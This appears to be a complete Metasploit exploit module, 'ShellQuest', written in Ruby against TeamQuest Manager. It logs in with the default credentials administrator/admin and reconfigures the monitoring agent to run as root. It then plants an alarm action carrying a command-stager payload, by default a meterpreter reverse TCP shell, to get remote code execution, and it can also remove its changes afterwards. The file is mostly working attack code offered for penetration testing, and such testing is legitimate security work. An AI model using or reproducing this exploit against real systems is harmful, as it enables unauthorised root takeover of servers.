##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'cgi'

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking
	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::CmdStager

	def initialize(info = {})
		super(update_info(info,
				  'Name'	=> 'ShellQuest',
				  'Description'	=> %q{
							Leverages default credentials in TeamQuest manager to achieve RCE on vulnerable host. Run 'check' instead of 'exploit' if you just want to verify that default credentials are in use. Command execution occurs when created alerts run, which can take a little bit of time....be patient. When you are done getting shells set the option of CLEANUP to true, and the module will undo all changes for you.
						},
							'Author'	=> ['ya boi Ian <i-am@ianpowe.rs>'],
				  'License'	=> MSF_LICENSE,
				  'Platform'	=> 'linux',
				  'Targets'	=> 
					[
					  ['Linux',
						{
						  'Platform' => ['linux']
					  	}
					  ]
					],
				  'Payload'     => {'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'},
				  'DefaultOptions' =>
						{
							'RPORT' => 2783,
							'SSL' 	=> true,
							'WfsDelay' => 300
						}#Set the default port and protocol to be HTTPS since this is encountered more than the HTTP variant on port 2780
		))
		
		#create TARGETURI value and set default login path, have not seen a variation on the login path yet
		register_options(
			[
				OptString.new('TARGETURI',[true,'The base path','/teamquest/cgi-bin/login']),
				OptInt.new('WfsDelay',[true,'How long to wait (in seconds) for the session to come back',300]),
				OptBool.new('CLEANUP',[true,'Set to true to undo any changes left from exploitation',false])
			], self.class)
	end #initialize

	def splash
		splashText = %{  
  .dBBBBP   dBP dBP dBBBP  dBP    dBP       dBBBBP  dBP dBP dBBBP.dBBBBP dBBBBBBP
  BP                                       dB'.BP                BP              
  `BBBBb  dBBBBBP dBBP   dBP    dBP       dB'.BP  dBP dBP dBBP   `BBBBb   dBP    
     dBP dBP dBP dBP    dBP    dBP       dB'.BB  dBP_dBP dBP        dBP  dBP     
dBBBBP' dBP dBP dBBBBP dBBBBP dBBBBP    dBBBB'B dBBBBBP dBBBBP dBBBBP'  dBP     
}
		print(splashText)
	end

	def login(uri) #function attempts to log in to TeamQuest instance using the default credentials administrator/admin, returns reponse from web server
		res = send_request_cgi({
			'method'	=> 'POST',
			'uri'		=> uri,
			'cookie'	=> get_session_id(uri),
			'vars_post'	=> {
				'javascript' => "on",
				'username' => "administrator",
				'pass' => "admin"
			}
		})
		return res
	end #login

	def logged_in(res) #function checks if login was succesful based on response codes from the webserver, returns bool for login success
		#if redirected login was succesful
		if res && res.code == 302
			print_good("Successful login using default credentials")
			return true
			
		#for some reason in ruby elseif is elsif, 200 response code is generally a result of login failure
		elsif res && res.code == 200
			print_bad("Login failed")
			return false

		#any other response codes are probably due to networking errors (like TeamQuest not actually running on the port)
		else
			print_error("Connection failed")
			return false
		end #if

	end #loggedIn
	
	def get_session_id(uri) #obtains valid session id necessary to make successful login request, returns the tqb cookie and value as a string
		res = send_request_cgi({
			'method' => 'GET',
			'uri'	 => uri
		})
		sid = res.get_cookies.scan(/(tqb=(\w+-){4}\w+);*/).flatten[0] || ''
		return sid
	end #get_session_id

	def get_csrf_token(uri,sid) #obtains csrf token on given url and returns the value of the token along with session id to complete necessary cookies for requests
		#get dbselect otherwise request will redirect for some reason
		send_request_cgi({
			'method' => 'GET',
			'uri' 	 => '/teamquest/cgi-bin/dbselect',
			'cookie' => sid
		})
		
		res = send_request_cgi({
			'method' => 'GET',
			'uri' 	 => uri,
			'cookie' => sid
		})

		if res && res.code == 200
			csrf = %r{(?<=id='csrf_token' value=')(.*)(?='>)}im.match(res.body.to_s) #performs regex to parse out csrf token from hidden field in body that is type converted to a string
			print_status("Obtained CSRF token: %s" % csrf)
			cookie = sid + '; tqcsrf=' + csrf[0] #csrf has become a MatchData type, in order to access string set index to zero 
			return cookie
		elsif res && res.code == 302
			print_bad("Attempted to obtain CSRF token but was redirected for some reason.")
			return false
		else
			print_error("Something bad and unexpected happened when attempting to get CSRF token.")
			return false
		end
	end #get_csrf_token

	#modifies what user and group the agent runs as on the vulnerable host
	def change_agent_user(sid,priv)
		#obtain csrf token to make request with
		cookie = get_csrf_token('/teamquest/cgi-bin/agent?lsService&edit=tqalm&eletype=tqalm&stat',sid)
		
		if cookie
			print_status("Attempting to change tqalm agent user to %s" % priv)
			res = send_request_cgi({
				'method'    => 'POST',
				'uri' 	    => '/teamquest/cgi-bin/agent',
				'cookie'    => cookie,
				'vars_get'  => {
					'ls' 	  => 'Service',
					'edit'	  => 'tqalm',
					'eletype' => 'tqalm'
				},
				'data' 	    => 'Command+User='+priv+'&Command+Group='+priv #used data field instead of vars_post since vars_post url encoded special characters I did not want encoded
			})
			if res && res.code == 200
				print_good("Changed tqalm agent to run as %s" % priv)
			else
				print_error("Could not change tqalm agent")
			end
		end
	end #change_agent_user

	def add_alarm(sid,alarmName,actionName)
		cookie = get_csrf_token('/teamquest/cgi-bin/alm?new=alarm&section=warning',sid)
		
		if cookie
			print_status("Attempting to create alarm: %s" % alarmName)
			res = send_request_cgi({
				'method' => 'POST',
				'uri'    => '/teamquest/cgi-bin/alm?new=alarm',
				'cookie' => cookie,
				'data'   => 'name='+alarmName+'&severity=warning&ea=disk_space_free_alias&eo=ge&ev=0&doaction='+actionName+'&add=Add'
			})
			if res && res.code == 200
				print_good("Created alarm: %s" % alarmName)
			else
				print_error("Failed to create alarm")
			end
		end
	end #add_alarm

	def activate_changes(sid)
		print_status("Attempting to activate changes")
		cookie = get_csrf_token('/teamquest/cgi-bin/activate?',sid)

		if cookie
			res = send_request_cgi({
				'method' => 'POST',
				'uri' 	 => '/teamquest/cgi-bin/activate?confirm',
				'cookie' => cookie,
				'data' 	 => 'n=Agent+Configuration+Settings&cb=1&n=Alarm+Policy&cb=1&confirm=Activate+Changes'
		})

			if res && res.code == 302
				print_good("Changes have been activated")
			else
				print_error("Could not activate changes")
			end
		end		
	end

	def delete_alarm(sid,alarmName)
		cookie = get_csrf_token('/teamquest/cgi-bin/alm?rm='+alarmName,sid)
		
		if cookie
			print_status("Attempting to delete alarm: %s" % alarmName)
			res = send_request_cgi({
				'method' => 'POST',
				'uri'    => '/teamquest/cgi-bin/alm?rm='+alarmName,
				'cookie' => cookie,
				'data'   => 'delete=Delete'
			})
			if res && res.code == 302
				print_good("Deleted alarm: %s" % alarmName)
			else
				print_error("Failed to delete alarm")
			end
		end

	end

	def delete_alarm_action(sid,actionName)
		cookie = get_csrf_token('/teamquest/cgi-bin/alm?rm='+actionName,sid)
			if cookie
				print_status("Attempting to delete alarm action: %s" % actionName)
				res = send_request_cgi({
					'method' => 'POST',
					'uri' 	 => '/teamquest/cgi-bin/alm?rm='+actionName,
					'cookie' => cookie,
					'data' 	 => 'delete=Delete'
				})	
				if res && res.code == 302
					print_good("Deleted action: %s" % actionName)
				else
					print_error("Failed to delete action")
				end
			end
	end
	
	def check
		res = login(target_uri.path)
		if logged_in(res)
			Exploit::CheckCode::Vulnerable
		else
			Exploit::CheckCode::Safe
		end
	end #check
	
	def execute_command(cmd, opts={})
		uri = target_uri.path
		actionName = 'eis_pentest_action'
		alarmName = 'eis_pentest_alarm'

		print_status("Attempting to login using default credentials")
		#set post request to login page with default creds
		res = login(uri)	
		if logged_in(res)
			#parse logged in session token out from response
			sid = res.get_cookies.scan(/(tqb=(\w+-){4}\w+);*/).flatten[0] || ''
			print_status("Obtained session cookie: %s" % sid)
			
			#perform changes to teamquest to achieve root shell
			#change tqalm to run as root
			change_agent_user(sid,'root')

			#create alarm action
			#obtain csrf token to make requests with
			cookie = get_csrf_token('/teamquest/cgi-bin/alm?new=action',sid)
			print_good("Generated payload: %s" % cmd)
			sploit = CGI.escape(cmd)
			if cookie
				print_status("Attempting to create alarm action: %s" % actionName)
				res = send_request_cgi({
					'method' => 'POST',
					'uri' 	 => '/teamquest/cgi-bin/alm?new=action',
					'cookie' => cookie,
					'data' 	 => 'name='+actionName+'&msg=&snmptxt=&command='+sploit
				})	
				if res && res.code == 302
					print_good("Created action: %s" % actionName)
				else
					print_error("Failed to add action")
				end
			end

			#create alarm condition
			add_alarm(sid,alarmName,actionName)

			#activate changes
			activate_changes(sid)
		end
	end

	def clean_up
		print_good("Clean up time!")
		actionName = 'eis_pentest_action'
		alarmName = 'eis_pentest_alarm'
		uri = target_uri.path
		res = login(uri)
		if logged_in(res)
			#parse logged in session token out from response
			sid = res.get_cookies.scan(/(tqb=(\w+-){4}\w+);*/).flatten[0] || ''
			print_status("Obtained session cookie: %s" % sid)
			
			#change agent back to nobody
			change_agent_user(sid,'nobody')

			#delete alarm condition
			delete_alarm(sid,alarmName)

			#delete alarm action
			delete_alarm_action(sid,actionName)

			#activate changes to finish cleanup
			activate_changes(sid)
		end
	end

	def exploit
		splash
		if datastore['CLEANUP']
			clean_up
		else
			#creates payload and performs all actions necessary to gain shell
			execute_cmdstager(flavor: :printf)
		end
	end #exploit
end
